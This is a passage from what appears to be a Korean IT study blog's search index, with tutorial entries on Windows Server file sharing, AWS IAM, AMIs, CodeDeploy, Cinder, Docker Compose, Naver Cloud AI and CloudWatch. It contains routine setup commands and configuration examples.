및 폴더의 공유가 가능합니다.\n  이를 사용하기 위해 먼저 FIRST 서버에서 네트워크 설정으르 수행합니다.\n  하단의 그림과 같이 제어판 \u0026gt; 네트워크 및 공유 센터 \u0026gt; 고급 공유 설정 \u0026gt; 엑세스가 가능하도록 개인, 게스트 또는 공용 및 모든 네트워크를 설정합니다.\n         설정이 완료 된 후, C 드라이브에 사용자 폴더에 가면 공용폴더가 생성된 것을 확인할 수 있습니다.       공유를 확인하기 위해 공유 폴더 \u0026gt; 공유 문서 \u0026gt; 공유폴더!.txt를 생성합니다.       확인을 위해 WINCLIENT에서 \\\\192.168.10.11을 통해 공유 폴더에 접속합니다.        접속이 완료되면 FIRST 서버에 공유폴더가 나오며 생성한 파일 확인을 위해 공용 \u0026gt; 공용 문서를 확인합니다.\n  파일이 존재하는 것을 확인할 수 있으며, 이를 삭제시 FIRST에서도 삭제되어 있는 것을 확인할 수 있습니다.\n      폴더공유    다음으로는 공유폴더가 아닌 폴더를 공유하는 방법에 대해 알아보도록 하겠습니다.\n  먼저 하단의 그림과 같이 4개의 폴더를 생성합니다.\n        먼저 읽기만 폴더의 속성 \u0026gt; 고급 공유를 클릭 후 권한을 설정합니다.\n  읽기 권한을 실행권한만을 의미하며 쓰기는 생성 및 삭제가 가능한 권한을 의미합니다.\n  읽기쓰기 권한을 가진 폴더 또한 동일한 방법으로 다른 모든 권한을 주어 설정합니다.\n       User02 폴더는 권한에서 모든 사용자를 제거 후에 User02를 설정합니다.        인증받은 사용자를 설정하는 방법 또한 동일합니다.\n  또한 공유폴더의 공유이름의 뒤에 $를 붙일 경우 숨긴폴더가 됩니다.\n  설정이 완료되었으면 모든 폴더 안에 아무 txt파일이나 생성합니다.\n       설정이 완료되면 WINCLIENT에서 전과 동일하게 접속했을 때, 추가적으로 폴더가 보이는 것을 확인할 수 있습니다.       먼저 읽기만 폴더에서 파일을 생성하거나 삭제했을 때는, 그림과 같은 권한 오류가 발생합니다.        하지만 읽기, 쓰기 권한이 설정된 폴더에서는 생성 및 삭제가 가능합니다.\n  이와 동일하게 User02로 접속하였기 때문에 User02 전용 폴더 및 인증된 사용자에서의 활동도 동일하게 가능합니다.\n       서버측에서는 컴퓨터 관리 \u0026gt; 공유 폴더 \u0026gt; 공유에서 현재 접속해있는 클라이언트의 수의 확인 및 제한이 가능합니다.       또한 서버매니저에서 파일 및 저장소 서브스 및 공유 \u0026gt; 공유에서도 확인이 가능합니다.       만약 특정 폴더에 대해서만 특정유저로 접속하고 싶을 때나, 지속적으로 접속을 유지하고 싶을 때는 홈 \u0026gt; 빠른 열결 \u0026gt; 네트워크 드라이브 연결을 선택합니다.        폴더에는 직접 경로를 적어도 가능하며, 하단의 그림과 같이 IP를 적고 찾아보는 것 또한 가능합니다.\n  다른 계정으로 접속을 원할 경우에는 다른 자격 증명을 사용하여 연결을 선택합니다.\n  네트워크 드라이브를 통해 연결하면 지속적인 연결이나 혹은 다른 계정을 통해 접근하는 것이 가능합니다.\n                           설정이 완료되면 숨김폴더 및 확장자를 확인할 수 있습니다.\n  그 외 상황에 맞게 여러 설정이 가능합니다.\n      ****    드라이브 최적화    드라이브 최적화는 디스크 조각모음으로 각 디스크에 위치를 자동으로 바꿔 보다 효율적으로 운용될 수 있게 합니다.\n  디스크 최적화를 실행하기위해서는 로컬 디스크 속성 \u0026gt; 도구 \u0026gt; 드라이브 최적화 및 조각 모음을 선택합니다.\n  기본적으로 자동적으로 수행하며 수동으로 수행이 가능합니다. 단 SSD의 경우에는 보통 최적화가 필요없습니다.\n      색인기능    기본적으로 윈도우 서버는 Ctrl + F로 검색기능을 수행하지만, 만약 파일이 다수 존재할시에는 문제가 발생할 수 있습니다.\n  윈도우 서버에서는 이를 위해 추가적인 색인기능을 지원하고 있으며, 이를 사용해보도록 하겠습니다.\n      먼저 서버매니저의 관리 \u0026gt; 역할 및 기능 추가를 선택합니다.       기능 \u0026gt; Windows Search Service를 선택하여 설치를 진행합니다.       설치가 완료되면 실행하기 위해 서비스 \u0026gt; Windows Search의 시작유형을 설정합니다.       색인 서비스를 사용하기 위해 제어판에서 색인을 검색 후 색인 옵션을 선택합니다.       색인 옵션에서 수정을 선택하여 C 드라이브를 색인범위에 추가합니다.        색인이 완료되면 고급을 선택하여 현재 위치를 확인합니다.\n  색인 서비스를 가능하면 다른 드라이브에 사용하는 것이 속도면에서 좋습니다.\n       설정이 완료되면 하단의 그림과 같이 보다 효율적인 탐색이 가능합니다.                                 "}),a.add({id:110,href:'/docs/aws/awssaa/saa-6/',title:"6장 인증과 권한",content:"6장 인증과 권한 부여 - AWS Identity and Access Management   6장의 목표   안전한 애플리케이션 및 아키텍처 설명   어떻게 애플리케이션 티어를 보호할지 결정한다.\n  어떻게 데이터르 보호하맂 결정한다.\n         AWS 리소스는 기업의 소중한 자산이므로 엄격하게 보호돼야 한다.\n  그렇다고 관리자와 고객조차 액세스 할 수 없을 정도로 보안 수준을 높일 수도 없다.\n  높은 보안 수준을 유지하면서 관리자와 고객의 액세스는 허용할 수 있는 완벽한 절충점이 IAM이다.\n  IAM은 사용자의 요청을 인증 (Authentification),해서 정당하게 사용하는 것을 확인하고 권한 부여 (Authorization)로 필요한 만큼 정확하게 액세스 할 수 있게 할 수 있다.\n  AWS는 주로 IAM으 통해 자격을 인증학 권한을 부여한다.\n  6장에서는 IAM 자격증명, 보안 주체를 학습하며 자격 증면은 AWS의 사용자의 역할을 나타내고, 여기서의 역할이란 애플리케이션 서비스, 사용자, 그룹에 일시적으로 할당할 수 있는 자격 증명을 의미한다.\n  자격증명은 다른 서비스와 연동해서 사용할 수 있으며, AWS 계정 외부의 사용자나 애플리케이션을 인증하고, AWS 리소스에 임시 액세스하는 데 Kerberos, Microsoft Active Directory, LDAP (Lightweight Directory Access Protocol)과 같은 외부 서비스를 사용할 수 있다.\n  정책을 통해서 AWS 계정의 모든 리소스아 상호 작용할 수 있는 방법을 정교하게 정의해서 자격 증명을 제어할 수 있다.\n  정책은 보안 주체(Principal, 자격 증명 기반) 또는 리소스에 연결한다.\n  계정에서 보안 주체의 작업을 자세히 통제하기 위한 정책 수립\n  보안 주체의 자격을 증명하기 위해 사용되는 다양한 종류의 키 또는 토큰 관리\n  자격 증명 연동을 사용해서 IAM을 외부 공급자와 통합하기 위한 Single Sign-On 솔루션 제공\n  리소스를 적절하게 보호하기 위해 계정과 역할을 구성하는 모범 사례 구현\n       IAM 자격 증명    새 AWS 계정을 만들면 하나의 자격 증명이 같이 만들어지며, 이 자격 증명은 루트 사용자이다.\n  루트는 기본적으로 계정에 연결된 서비스와 리소스 전체에 완전한 권한을 가지고 있으며, 오직 루트 사용자만이 모든 서비스에 완벽하게 액세스 할 수 있다.\n  루트의 모든 권한을 가지고 있는 사용자는 해커에 공격에 매우 위험하며, 이 경우 계정 전체가 위험에 빠질 수 있다.\n  AWS는 보안 취약점 노출을 줄이기 위해 루트 계정을 철저하게 보호하고 일상적 작업에 필요한 구체적 권한을 다른 사용자에게 위임하는 것을 제안한다.\n     IAM 정책        "}),a.add({id:111,href:'/docs/aws/awstraining/ami/',title:"AWS AMI 생성",content:"AWS AMI 생성    저번 장에서는 EC2를 생성해보았습니다. 이번 Marketplace에서 AMI를 사용해서 인스턴스를 만들고, 생성한 인스턴스를 사용해서 AMI를 만들어 보도록하겠습니다. AMI에 대한 학습을 원하는 분들은 AWS AMI를 참고해주세요.    AWS AMI 생성      먼저 EC2 생성을 위해 인스턴스 시작을 클릭 합니다.      AMI 선택화면이 나오면 AWS Marketplace에서 CentOS를 입력 후, 선택합니다. 이와 같이 Marketplace에서는 사람들이 만들어둔 이미지를 사용할 수 있습니다. ( 단, 유료도 있으니 주의가 필요합니다. )      AMI를 선택 후, EC2를 생성합니다. 혹시 생성방법을 모르시는 분들은 EC2 생성 를 참조해주세요 인스턴스의 생성이 완료되면 퍼블릭 IP로 접속합니다.     $ sudo yum install -y httpd $ sudo systemctl enable httpd  Apache 설치 및 자동시작을 등록합니다. 퍼블릭 IP로 접속하여 확인해보세요.      이제 AMI를 만들어보겠습니다. AWS Console 환경에서 AMI를 만들 인스턴스를 우 클릭 후, 이미지 -\u0026gt; 이미지 생성을 클릭합니다.      이미지 이름과 설명을 입력 후, 원하는 볼륨을 설정하여 이미지를 생성합니다.      메뉴바의 이미지에서 AMI를 클릭하면, 현재 만든 AMI를 확인할 수 있습니다.      만든 AMI의 상태가 available이 되면, 다시 인스턴스 생성으로 돌아와 AMI 선택에서 이번에는 AWS Marketplace가 아닌, 나의 AMI를 선택하여 생성합니다. 생성 후, 퍼블릭 IP로 접속하면 Apache가 설치되어 있는 것을 확인 할 수 있습니다.    이와 같이 AMI를 사용하면, 보다 편리하고 빠르개 인스턴스를 생성할 수 있습니다.     AWS CLI로 AMI 생성    AMI 또한 AWS CLI를 통해 생성이 가능합니다.   $ aws ec2 create-image \\ --instance-id [ 인스턴스 ID ] --name \u0026#34;[ AMI 이름 ]\u0026#34; --description \u0026#34;[ AMI 설명 ]\u0026#34; # 인스턴스 ID를 가진 인스턴스를 AMI 이름과 AMI 설명을 가진 AMI 이미지로 생성합니다. $ aws ec2 describe-images \\ --image-id [ AMI ID ] # AMI ID를 가진 AMI에 대한 정보를 알려줍니다.    예제 1. Ubuntu18.04의 OS에서 Apache2가 설치되어 있고, 자동시작되는 AMI를 생성해보세요. ( 단, Putty로 접속하여 설치하면 안됩니다. )  \r예제 1. 답안\r↕\r\r User data를 사용하여, 자동 설치 후 AMI를 생성합니다.\n \r\r\r "}),a.add({id:112,href:'/docs/aws/amazonwebservice/aws_developer/',title:"AWS Developer",content:"AWS_Developer   AWS CodeBuild    AWS CodeBuild는 소스 코드를 컴파일하는 단계부터 테스트 실행 후 소프트웨어 패키지를 개발하여 배포하는 단계까지 마칠 수 있는 완전관리형의 지속적 통합 서비스 CodeBuild는 지속적으로 확장되며 여러 빌드를 동시에 처리 사전 패키징된 빌드 환경을 사용하면 신속하게 시작할 수 있으며 혹은 자체 빌드 도구를 사용하는 사용자 지정 빌드 환경제작 가능 AWS CodeBuild는 코드를 실행하고 아티팩트를 Amazon S3 버킷에 저장 CodeBuild에서는 사용한 컴퓨팅 리소스에 대한 분당 요금이 청구    AWS CodeCommit    AWS CodeCommit은 안전한 Git 기반 리포지토리를 호스팅하는 완전관리형 소스 제어 서비스 뛰어난 확장성의 안전한 에코시스템에서 여러 팀이 협업하여 코드 작업을 수행가능 CodeCommit을 사용하면 소스 코드에서 바이너리까지 모든 항목을 안전하게 저장할 수 있고 기존 Git 도구와 원활하게 연동   에코시스템\n 자연계의 생태계처럼 관련 기업이 협력하여 공생하는 시스템을 의미 IT 분야의 여러 기업이 몇몇 리더 기업을 중심으로 경쟁과 협력을 통해 공생하고 함께 발전해 나가는 모습을 지칭  \r   AWS CodeDeploy    AWS에서 제공하는 배포 자동화 서비스 EC2 인스턴스들에 코드를 배포하는 과정을 자동으로 진행시켜 줌 카피스트라노 ( Capistrano )나 젠킨스 ( Jenkins ) 같은 서드파티 배포 자동화도구 보다 AWS 내 다양한 서비스와 손쉽게 연동이 가능하다. CodeDeploy는 무중단 배포 기법들인 IDP/ BGD를 둘다 지원한다. CodeDeploy란 단순히 명령어를 적어두고 프로그램이 그 명령을 순차적으로 실행하는 것 뿐이다. 단순히 우리가 해주는 일을 대신 해주는 Auto Scaling과 같은 개념 CodeDeploy로 배포하고자 한다면 EC2 인스턴스에 반드시 설치되어 있어야 하며 *.yml파일에 있는 절차를 따라서 배포를 진행한다.   CodeDeploy 구성요소   \rAppSpec.yml\r↕\r\rvesion: 0.0 os: linux # 윈도우, 리눅스 등 어떤 OS를 위한 배포 파일인지를 명시한다. # CodeDeploy Agent는 배포 명령을 받으면 코드 저장소에 있는 프로젝트 전체를 서버의 임시 결로로 내려 받는다. # 내려받은 프로젝트를 서버 내 어느 경로로 이동시킬지 명시할 수 있다. files: - source: / destination: /var/www # AppSpec.yml에서는 배포 시 발생하는 다양한 생명주기마다 원하는 스크립트를 실행할 수 있게 후크를 제공해준다. # 배포 시 사용하는 스크립트들은 훤하는 곳에 둬도 되며, 보통은 프로젝트에 AppSpec.yml 파일을 포함하듯이 함께 포함한다. # 이 예시에서는 프로젝트 최상단에 scripts라는 디렉터리를 만들어 그 안에 스크립트들을 보관해 둔다. hooks: # 코드 저장소에서 프로젝트를 낼받은 뒤 인스턴스 내 배포를 원하느 경로에 파일들을 옮기기 전이며, 예시에서 사용한 스크립트의 이름을 보면 리소스 데이터 번들을 압축 해제하는 것으로 추축할 수 있다. BeforeInstall: - location: scripts/UnzipResourceBundle.sh - location: scripts/UnzipDataBundle.sh # 파일을 모두 이동한 후 실행되는 스크립트들이다. # 파일 이름을 봐서 리소스 파일들이 제대로 존재하는 지 테스트하는 것으로 추측할 수 있다. # 또한 Timeout 옵션을 두어 180초 이내에 스크립트가 완료되지 않으면 배포에 실패한 것으로 간주한다. AfterInstall: - location: scripts/RunResourceTests.sh timeout: 180 # 애플리케이션을 시작할 때 사용하는 스크립트들이다. # 예시에서는 서버를 재시작하고 최대 240초 동안 기다리는 것을 알 수 있다. ApplicationStart: - location: scripts/RestartServer.sh timeout: 240 # 서비스를 재시작한 후 실제로 서비스가 올바르게 실행됐는 지 확인 할 때 사용한느 스크립트들이다. # runas 옵션을 주어 기본 사용자인 ec2-user가 아닌 codedeployuser라는 다른 user로 실행하게 했다. ValidateService: - location: scripts/ValidateService.sh timeout: 30 runas: codedeployuser \r\r\r\r   스크립트 파일들에 실행 권항을 추가해서 Git에 올리고 싶다면 다음과 같은 명령어를 이용하면 된다.  git update-index --chmod=+x \u0026lt;스크립트 파일 이름\u0026gt;\r \rCodeDeploy 작동절차\r...\r\r CodeDeploy 작동절차    AppSpec.yml 파일을 추가한 후, 프로젝트를 코드 저장소인 GitHub 혹은 AWS S3에 업로드한다.   CodeDeploy에 프로젝트의 특정 버전을 배포해 달라 요청한다.   CodeDeploy는 배포를 진행할 EC2 인스턴스들에 설치되어 있는 CodeDeploy Agent들과 통신하며 Agent들에게 요청받은 버전을 배포해 달라고 요청한다.   요청을 받은 CodeDeploy Agent들은 코드 저장소에서 프로젝트 전체를 서버로 내려받는다. 그리고 내려받은 프로젝트에 있는 AppSpec.yml 파일을 읽고 해당 파일에 적힌 절차대로 배포를 진행한다.   CodeDeploy Agent를 배포를 진행할 후 성공/ 실패 등 결과를 CodeDeploy에게 전달한다.  \r\r\r   AWS CodePipeling    AWS CodePipeline은 빠르고 안정적인 애플리케이션 및 인프라 업데이트를 위해 릴리스 파이프라인을 자동화하는 데 도움이 되는 완전관리형 지속적 전달 서비스 코드 변경이 발생할 때마다 사용자가 정의한 릴리스 모델을 기반으로 릴리스 프로세스의 빌드, 테스트 및 배포 단계를 자동화 AWS CodePipeline을 GitHub 또는 자체 사용자 지정 플러그인과 같은 타사 서비스와 손쉽게 통합가능 사용한 만큼만 비용을 지불합니다. 선결제 금액이나 장기 약정이 존재하지 않음    AWS X-Ray    AWS X-Ray는 개발자가 마이크로 서비스 아키텍처를 사용해 구축된 애플리케이션과 같은 프로덕션 분산 애플리케이션을 분석하고 디버그하는 데 도움을 주는 서비스 X-Ray를 사용해 자신이 개발한 애플리케이션과 기본 서비스가 성능 문제와 오류의 근본 원인 식별과 문제 해결을 올바로 수행하는지 파악가능 X-Ray는 요청이 애플리케이션을 통과함에 따라 요청에 대한 엔드 투 엔드 뷰를 제공하고 애플리케이션의 기본 구성 요소를 맵으로 제시 3-티어 애플리케이션에서부터 수천 개의 서비스로 구성된 복잡한 마이크로 서비스 애플리케이션에 이르기까지 개발 중인 애플리케이션과 프로덕션에 적용된 애플리케이션 모두 분석가능  "}),a.add({id:113,href:'/docs/openstack/openstack/cinder/',title:"Cinder",content:"블록 스토리지 서비스 : Cinder   블록 스토리지 서비스 : Cinder   Cinder은 bloack storage 서비스로 storage를 가상화 시켜 여러 스토리지로 사용하거나, 공유할 수 있는 서비스 Cinder은 하나 이상의 노드에서 실행되도록 설계되었으며, SQL 기반 중앙 데이터베이스를 사용 Cinder은 집계 시스템을 사용하여 여러 데이터 저장소로 이동이 가능     Cinder 구성요소      구성요소 역할     DB 데이터저장을 위한 SQL 데이터베이스로, 모든 구성요소에서 사용   Web Dashboard API와 통신할 수 있는 외부 인터페이스   api http 요청을 받고 명령을 변환하여 대기열 또는 http를 통해 다른 구성요소와 통신   Auth Manager 사용자/ 프로젝트/ 역할에 따라, 리소스의 대한 허용을 결정   Scheduler 볼륨을 가져올 호스트를 결정   volume 동적으로 부착 가능한 블록 장치를 관리   backup 블록 저장 장치의 백업을 관리      외부 인터페이스인 dash-board에서 요청을 보내면, Cinder-api가 keyston에게 인증을 확인하기 위해 요청을 보낸다. 인증이 완료되면 DB를 읽어 알맞은 리소스를 생성, 혹은 할당하는 프로세스를 가진다.     Cinder의 논리 아키텍처      구성요소 역할     Cinder-api 요청에 따라 storage를 할당, 확장하는 기능을 수행   Queue 각 구성요소 간의 통신기능을 수행   Cinder database Cinder 서비스를 수행하기 위한 일련의 정보들은 보관, 관리하는 DB   cinder voulme Cinder 서비스를 통해 가상화되어진 Storage voulme, voulme을 관리 및 업데이트   volume provider storage volume을 생성, 확장하는 서비스   cinder scheduler 요청이 다수인 경우 큐를 통해 받은 메시지를 수행      Nova에서 생성된 인스턴스에서 확장해서 사용할 수 있는 저장 공간을 생성, 삭제하고 인스턴스에 연결 할 수 있는 기능을 제공 Cinder는 물리 하드 디스크를 LVM(Logical Volume Manager)으로 설정 설정된 LVM은 cinder-conf와 nova.conf의 환경을 설정해서 cinder-volume을 할당 cinder-api로 생성된 볼륨은 단일 인스턴스 또는 여러 인스턴스에 할당 할 수 있음     Cinder driver type   Cinder 기본 블록 스토리지 드라이버는 iSCSI 기반의 LVM  LVM이란 하드 디스크를 파티션 대신 논리 볼륨으로 할당하고, 디스크 여러 개를 좀 더 효율적이고 유연하게 관리할 수 있는 방식을 의미      블록 장치는 물리 볼륨으로 초기화해야 하며, 논리 볼륨으로 생성하려면 물리 볼륨을 볼륨 그룹으로 통합해야 함    "}),a.add({id:114,href:'/docs/docker/docker/docker/docker-6/',title:"Docker Compose",content:"Docker Compose    도커는 복잡한 설정을 쉽게 관리하기 위해 YAML방식의 설정파일을 이용한 Docker Compose라는 툴을 제공합니다.   Docker compose 설치 $ curl -L \u0026#34;https://github.com/docker/compose/releases/download/1.9.0/docker-compose-$(uname -s)-$(uname -m)\u0026#34; -o /usr/local/bin/docker-compose $ chmod +x /usr/local/bin/docker-compose # docker-compose download docker-compose version 1.9.0, build 2585387 docker-py version: 1.10.6 CPython version: 2.7.9 OpenSSL version: OpenSSL 1.0.1t 3 May 2016 $ docker-compose version # 확인    Docker Compose로 wordpress 생성 $ vi docker-compose.yml version: \u0026#39;2\u0026#39; services: db: image: mysql:5.7 volumes: - db_data:/var/lib/mysql restart: always environment: MYSQL_ROOT_PASSWORD: wordpress MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: wordpress wordpress: depends_on: - db image: wordpress:latest volumes: - wp_data:/var/www/html ports: - \u0026#34;8000:80\u0026#34; restart: always environment: WORDPRESS_DB_HOST: db:3306 WORDPRESS_DB_PASSWORD: wordpress volumes: db_data: wp_data: $ docker-compose up # 컨테이너 생성   "}),a.add({id:115,href:'/docs/ncp/ncptraining/nca06/',title:"Naver Cloud AI",content:"Naver Cloud AI    AI 플랫폼인 Clova, PaPago\n  딥러닝을 위한 Tensorflow가 탑재된 이미지를 제공\n    Chat bot    CS나 주문 시스템과 같은 고객 대응을 로봇으로 대체하는 상품\n  학습을 통해 적절한 답변을 자동화, CSR, CSS와 연동을 통해 메신저 뿐만 아니라 음성 채팅까지 확장 가능\n  라인, 톡톡, 페이스북 메신저와 연동\n       Clova Speech Recognition ( CSR )    음성을 텍스트로 변환\n  국내에서 가장 높은 한국어 인식률\n  Android 및 IOS SDK 제공\n  Rest API 제공\n  한국어, 영어, 일어, 중국어(간체) 제공\n       Clova Speech Synthesis ( CSS )    텍스트를 음성으로 변환\n  자연스러운 합성음\n  총 9개의 음색 제공 ( 언어별 2개 이하 )\n  Rest API 제공\n  한국어, 영어, 일어 중국어, 스페인어 제공\n       Clova Premium Voice    사랑의 음성에 가까운 고품질 합성을 제공\n  실시간 음성 생성이 가능한 Neural Vocoder를 사용하여 실제 사람의 음성에 가까운 자연스럽고 깨끗한 합성음을 제공\n  입력한 텍스트를 RESTful API 방식으로 전달하면 서버에서 인식해 mp3 포맷의 스트리밍 데이터나 파일로 리턴\n  엄격한 뉴스 앵커 스타일, 부드러운 친구 스타일, 담백한 스타일 등 다양한 감정과 스타일의 합성기가 제공될 예정\n       Clova OCR    진보된 템플릿 기능\n 지정된 템플릿에 맞추어 데이터를 추출하고 데이터베이스화       PaPago NMT ( Neutrl Machine Translation )    통계 기반 번역\n  번역할 언어의 종류를 자동 감지\n  학습을 통해 높아지는 성능\n  Rest API 제공\n  자연스러운 번역 기술 제공\n  영어, 일어, 중국어 제공\n       Pose Estimation    이미지내의 주요 신체 영역을 인식하고 해당 영역을 좌표로 변환\n  이미지를 분석하여 신체 영역 좌표를 결과값으로 제공\n  RESTful API 방식으로 제공\n  이미지는 2MB 이하로 제한\n       Object Detection    이미지내의 객체를 탐지하고 객체를 분석\n  객체를 탐지하여 객체의 이름, 바운딩 박스, 탐지 정확률을 제공\n  RESTful API 방식으로 제공\n  이미지는 2MB 이하로 제한\n      "}),a.add({id:116,href:'/docs/development/shell/shell-6/',title:"Shell Script System Security",content:"Shell Programming    Shell Script System Security         #\n"}),a.add({id:117,href:'/docs/infra/infra/infra06/',title:"Solution",content:"Solution    Solution   IT 인프라 운영에 이용되는 여러 장비를 효율적으로 관리하기위해서 다양한 솔루션을 활용합니다.     감시 솔루션    나기오스 감시 솔루션\n  웹 설정 화면이 없으며 설정을 텍스트 파일로 저장힙니다.\n  장애가 발생했는 지에 대한 이력을 데이터베이스가 아닌 텍스트 파일에 저장합니다.\n  감시 설정은 플러그인으로 추가할 수 있으며, 플러그인은 직접 만들 수 있고, 전용 커뮤니티에도 다량 공개되어 있습니다.\n       자빅스 솔루션\n  서버 네트워크 디바이스의 오토 디스커버리 지원\n  로우 레벨 디스커버리 지원\n  중앙 웹 관리 인터페이스로부터의 분산 감시 지원\n  폴링과 트래핑 지원\n  서버 운영체제로는 리눅스, 솔라리스, HP-UX, FreeBSD, OpenBSD, OS X를 지원\n  고성능 전용 에이전트 지원\n  에이전트 없는 감시\n  암호화로 보호된 사용자 인증\n  유연한 사용자 퍼미션 관리\n  웹 인터페이스\n  감시 대상 리소스의 고급 표시 기능\n  사전 정의된 이벤트를 메일 기반의 유연한 경고 기능으로 통지\n  감사 로그\n       캑타이\n  Cacti 지원\n  RRDTool 지원\n  NET-SNMP 지원\n  Apache\n  PHP\n  MySQL\n       기타 Solution   자산 관리 도구     많은 장비를 효율적으로 관리하려면 자산 관리 도구를 활용하는 것이 편리합니다.\n  자산 관리 도구는 상용 소프트웨어가 다수 존재하지만, 대부분 사내 PC의 효율적 관리를 목적으로 하기에 IT 인프라 자산 관리에는 맞지 않는 제품들이 많지만, 이런 이유로 특정 기업에 맞춰 자산 관리 도구 자체적으로 개발해주는 회사가 다수 존재합니다.\n     배포 시스템\n  여러 서버에 동시에 같은 소스 코드와 설정 파일 등을 배포 할 때, 한 대씩 수작으로 배포하는 것은 상당시간 시간을 소모하여, 이럴 때는 배포 시스템을 활용합니다.\n  배포 자체는 리눅스에서는 rsync 명령으로 윈도우에서는 robocopy 명령 등을 사용하면 구현할 수 있으며, 배포 이력 관리를 위해 배포 시스템을 만들거나 배포 기능에 특화된 오픈 소스를 이용하기도 합니다.\n       보안\n 서버 단위로 이루어지는 보안 대책으로는 백신 등의 소프트웨어를 서버에 설치하는 방법이 있으며, IT 인프라 전체에서 하는 대책으로는 LAN 내에 방화벽이나 IDS를 설치하는 방법이 존재합니다.       퍼실리티 관리 시스템\n 데이터 센터의 물리적 환경을 감시하는 시스템으로, 서버 랙의 온도와 각 랙의 전기 사용량, 다양한 센서를 실시간으로 감시하고 관리할 수 있습니다.       스토리지 관리 시스템\n 스토리지를 집중적으로 관리할 수 있는 시스템으로 각 스토리지의 가동 상황이나 사용 상황을 감시할 수 있음은 물론이고, 가상 스토리지를 동적으로 생성하고 용량을 확장/축소, 삭제가 가능합니다.       Security    보안 대책은 전체적인 관점에서의 보안 대책과 실시간으로 보안 인시던트를 감지하는 체제를 만드는 양면에서 접근할 필요가 있습니다.\n  특히 규모가 큰 인프라 환경에서는 각 서버에 맞춰 보안적 요소를 커스터마이징 하는 것이 필요하며, 보안 담당자를 두는 경우도 있습니다.\n  기업의 보안 대책은 그 자체로 직접적인 이익을 낳는 것은 아니지만, 보험과도 같은 것이라 할 수 있습니다. 해 두면 어느정도 안심은 되지만, 완벽한 상태는 절대 만들 수 없다는 성질을 가지고 있습니다.\n  하단은 일반적인 IT 인프라에서 지켜야할 정보의 예시입니다.\n  고객 데이터 전반\n  매출 정보\n  이메일 정보\n  각종 문서류\n  각종 소스 코드\n  종업원 명부\n       보안 담당자와 서버 담당자의 연계\n 서버에는 보안 구멍이 될 수 있는 요소가 다수 존재하며, 이를 위해 서버 및 보안 담당자는 유연한 연계를 통해 일을 계속해 나가야합니다.       외부 보안 업체 활용\n 부정 침입의 수법은 나날이 발전해나가고 있으며, 최신 부정 침입 수법을 모두 파악하긴 어려우므로 외부 보안 업체를 활용할 수 있습니다.       데이터 해시화 암호화\n 데이터를 해시화 및 암호화를 통해 데이터의 유출이 발생하더라도 이에 대한 악용을 사전에 예방하는 것 또한 하나의 방법입니다.      "}),a.add({id:118,href:'/docs/system/window/window06/',title:"암호화",content:"암호화   암호화               암호화 연습을 위해 C 에 암호화연습, 그 안에 암호화.txt에 중요파일을 기업 후 저장하고, 그냥.txt에 일반파일을 기입 후 저장합니다.\n  저장이 완료되면 암호화파일에 속성에서 고급 \u0026gt; 데이터 보호를 위한 암호화를 설정합니다.\n        파일만 암호화를 선택합니다.        설정이 완료되면 다음과 같이 암호화가 완료되며, 암호화시킨 유저만이 이 파일에 접근이 가능해집니다.\n  만약 문제가 생길 경우 키 파일이 있으면 접근이 가능합니다.\n              "}),a.add({id:119,href:'/docs/aws/awstraining/eip/',title:"AWS Elastic IP 할당",content:"AWS Elastic IP 할당   AWS Elastic IP ( 이하 EIP )란 인스턴스의 IP를 고정적으로 할당시킨 IP를 뜻합니다. 만약 인스턴스를 생성할 시, 퍼블릭 IP를 활성화 하면, 인스턴스를 자동 실행시마다 유동적으로 IP가 변화하여 문제가 되는 데, 이러한 문제들을 해결할 수 있습니다.    AWS Elastic IP 할당      EIP를 생성하기 위해 메뉴에서 EC2 서비스에서 네트워크 및 보안 -\u0026gt; 탄력적 IP를 선택합니다. 탄력적 IP 주소 할당을 클릭합니다.      Amazon의 IPv4 주소 풀로 할당 받습니다.      EIP의 생성이 완료되면, 할당을 위해 Actions -\u0026gt; EIP 주소 연결을 클릭합니다.      EIP의 연결 대상을 인스턴스 혹은 네트워크 인터페이스로 설정하여 연결을 진행합니다. 사실상, 인스턴스를 체크하여도 선택된 인스턴스의 네트워크 인터페이스에 EIP를 할당 하는 것입니다.      EIP를 할당한 인스턴스를 선택하면 퍼블릭 IP주소가 탄력적 IP로 바뀐 것을 확인할 수 있습니다.      EIP를 삭제하기 위해서는 EIP에 연결된 인터페이스가 없어야 하며, 삭제를 위해서는 EIP 주소 릴리스를 선택해줍니다.    프리티어에서도 EIP 한개의 사용이 무료이지만, 할당하고있는 EIP만 무료이며, 만약 할당받지 않은 채로 유지되면 과금이 부과되어 주의가 필요합니다.     AWS CLI로 EIP 할당   $ aws ec2 allocate-address  EIP를 할당 받습니다.     $ aws ec2 associate-address \\ --instance-id [ 인스턴스 ID ] \\ --allocation-id [ EIP ID ]  인스턴스 ID를 가진 인스턴스에 EIP ID를 가진 EIP를 할당합니다.     "}),a.add({id:120,href:'/docs/aws/amazonwebservice/aws_management/',title:"AWS Management",content:"AWS Management   Amazon CloudWatch    AWS 클라우드 리소스와 AWS에서 실행되는 애플리케이션을 위한 모니터링 서비스 리소스 및 애플리케이션에 대해 측정할 수 있는 변수인 지표를 수집하고 추적 가능 사용중인 모든 AWS 서비스에 대한 지표가 자동적으로 표시디며, 사용자 지정 대시보드를 통해 사용자 지정 애플리케이션에 대한 지표를 표시하고 지정 집합 표시 가능 지표는 Cloudwatch에 게시된 시간 순서별 데이터 요소 세트이며, 모니터링할 변수 ( 가령 EC2의 CPU 사용량은 EC2가 제공하는 하나의 지표 ) 기본 모니터링과 세부 모니터링으로 나뉘며, 가각 5분과 1분 주기로 수집함 기본 모니터링은 자동활성화이지만, 세부 모니터링은 선택사항 기본적으로 CPU, Network, Disk, Status Check 등을 수집 ( Memory 항목이 없음 ) 지표 데이터의 보존기간  기간 60초 미만의 경우, 3시간 기간 60초의 경우, 15일 기간 300초의 경우 63일 기간 3600초의 경우, 455일   AWS CLI 혹은 API를 이용하여, Cloudwatch에 사용자 정의 지표 게시 가능 경보기능을 사용하여 어떤 지표가 일정기간동안 일정값에 도달할 경우 각 서비스가 취해야할 행동을 정의할 수 있음 모니터링하기로 선택한 측정치가 정의한 임계값을 초과할 경우 하나 이상의자동화 작업을 수행하도록 구성 EC2의 경우, 경보에 따라, 인스턴스 중비, 복구, 종료, 재부팅 가능   Cloudwatch Agent  EC2에 Agent를 설치하게 되면 더 많은 시스템 수준 지표를 수집할 수 있음 온프레미스 서버 또한 Cloudwatch Agent 사용 가능 Memory 항목 포함 Cloudwatch Agent는 로그를 수집할 수 있으며, 후술할 Cloudwatch Logs 기능 사용 가능   Cloudwatch Logs  EC2( Agent에서 수집된 ), CloudTrail, Route 53, Route 53, VPC 